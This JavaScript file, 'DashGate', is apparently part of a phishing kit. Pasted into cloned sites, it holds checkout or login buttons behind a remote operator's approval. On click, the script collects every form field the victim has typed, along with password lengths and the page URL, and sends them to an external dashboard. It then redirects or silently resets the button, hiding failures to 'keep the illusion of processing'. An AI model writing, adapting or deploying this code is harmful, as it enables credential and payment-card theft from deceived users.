/* DashGate v1 - paste into any cloned site to gate a button behind Dash approval.
 *
 * Usage (no build step):
 *   <script src="https://YOUR-DASH.vercel.app/gate.js"></script>
 *   <button id="payBtn"
 *     data-dash-site="site-a"
 *     data-dash-redirect="/sites/site-a/success.html"
 *     data-dash-page="checkout-pay">Pay now</button>
 *   <script>DashGate.attach('#payBtn')</script>
 *
 * Or auto-wire every gated button: DashGate.attachAll('[data-dash-site]')
 *
 * Behavior:
 *  click -> POST /api/create-session -> button shows loading spinner
 *  poll  -> GET /api/poll-session?id= every 2s
 *  Pass    -> navigates to redirectUrl (operator-approved page)
 *  Not Pass-> silently resets button, stays on page, no error/note
 */
(function () {
  function apiBase() {
    if (window.DASH_API_BASE) return window.DASH_API_BASE.replace(/\/$/, '');
    var s = document.currentScript;
    if (s && s.src) {
      try { return new URL(s.src).origin; } catch (e) {}
    }
    var scripts = document.getElementsByTagName('script');
    for (var i = 0; i < scripts.length; i++) {
      var src = scripts[i].src || '';
      if (src.indexOf('gate.js') !== -1) {
        try { return new URL(src).origin; } catch (e) {}
      }
    }
    return location.origin;
  }

  var CSS = '.dash-loading{position:relative;pointer-events:none;opacity:.85;cursor:wait!important}'
    + '.dash-spinner{display:inline-block;width:1em;height:1em;margin-right:.5em;vertical-align:-0.15em;'
    + 'border:2px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;'
    + 'animation:dashspin .7s linear infinite}'
    + '@keyframes dashspin{to{transform:rotate(360deg)}}';

  function ensureCss() {
    if (document.getElementById('dashgate-css')) return;
    var st = document.createElement('style');
    st.id = 'dashgate-css';
    st.textContent = CSS;
    document.head.appendChild(st);
  }

  function collectMeta(btn) {
    var meta = {};
    try {
      if (btn.dataset.dashMeta) meta.extra = JSON.parse(btn.dataset.dashMeta);
    } catch (e) {}
    // Grab nearby form inputs so the dashboard shows what the user typed.
    var root = btn.closest('form') || document;
    var inputs = root.querySelectorAll('input,select,textarea');
    var fields = {};
    inputs.forEach(function (el) {
      if (el.type === 'password' || el.type === 'submit' || el.type === 'hidden') {
        if (el.name) fields[el.name] = el.type === 'password' ? '(password ••• ' + (el.value || '').length + ' chars)' : el.value;
        return;
      }
      if (el.name) fields[el.name] = el.value;
      else if (el.id) fields['#' + el.id] = el.value;
    });
    if (Object.keys(fields).length) meta.fields = fields;
    meta.href = location.href;
    return meta;
  }

  function setLoading(btn, on) {
    ensureCss();
    if (on) {
      if (btn.dataset.dashBusy === '1') return;
      btn.dataset.dashBusy = '1';
      btn.dataset.dashOrig = btn.innerHTML;
      btn.disabled = true;
      btn.classList.add('dash-loading');
      btn.innerHTML = '<span class="dash-spinner"></span>' + (btn.dataset.dashWaitText || 'Processing…');
    } else {
      btn.dataset.dashBusy = '';
      btn.disabled = false;
      btn.classList.remove('dash-loading');
      if (btn.dataset.dashOrig) btn.innerHTML = btn.dataset.dashOrig;
    }
  }

  async function handleClick(btn, ev) {
    if (ev) ev.preventDefault();
    if (btn.dataset.dashBusy === '1') return;
    var base = (btn.dataset.dashApi || apiBase()).replace(/\/$/, '');
    var siteId = btn.dataset.dashSite || btn.getAttribute('data-dash-site') || 'unknown';
    var redirectHint = btn.dataset.dashRedirect || btn.getAttribute('data-dash-redirect') || '/';
    var page = btn.dataset.dashPage || document.title || location.pathname;
    var pollMs = parseInt(btn.dataset.dashPoll || '2000', 10);
    var timeoutMs = parseInt(btn.dataset.dashTimeout || '180000', 10);

    setLoading(btn, true);
    var id = null;
    try {
      var r = await fetch(base + '/api/create-session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ siteId: siteId, page: page, meta: collectMeta(btn), redirectHint: redirectHint })
      });
      var j = await r.json();
      id = j.id;
      if (!id) { setLoading(btn, false); return; }
    } catch (e) {
      // Fail closed but silent: keep the illusion of processing briefly, then reset.
      setTimeout(function () { setLoading(btn, false); }, 1500);
      return;
    }

    var start = Date.now();
    async function poll() {
      if (Date.now() - start > timeoutMs) { setLoading(btn, false); return; }
      try {
        var pr = await fetch(base + '/api/poll-session?id=' + encodeURIComponent(id));
        var pj = await pr.json();
        if (pj.status === 'pass') {
          window.location.href = pj.redirectUrl || redirectHint;
          return;
        }
        if (pj.status === 'notpass') {
          // Silent block: reset button, stay on page, no error/note.
          setLoading(btn, false);
          return;
        }
      } catch (e) {}
      setTimeout(poll, pollMs);
    }
    poll();
  }

  function attach(selOrEl, opts) {
    var els = typeof selOrEl === 'string' ? document.querySelectorAll(selOrEl) : [selOrEl];
    els.forEach(function (btn) {
      if (!btn || btn.__dashWired) return;
      btn.__dashWired = true;
      if (opts && opts.apiBase) btn.dataset.dashApi = opts.apiBase;
      btn.addEventListener('click', function (e) { handleClick(btn, e); });
    });
  }

  function attachAll(sel) {
    attach(sel || '[data-dash-site]');
    // Re-scan for dynamically added buttons.
    if (!attachAll._obs && window.MutationObserver) {
      attachAll._obs = new MutationObserver(function () { attach(sel || '[data-dash-site]'); });
      attachAll._obs.observe(document.body, { childList: true, subtree: true });
    }
  }

  window.DashGate = { attach: attach, attachAll: attachAll };
  if (document.readyState !== 'loading') attachAll();
  else document.addEventListener('DOMContentLoaded', function () { attachAll(); });
})();
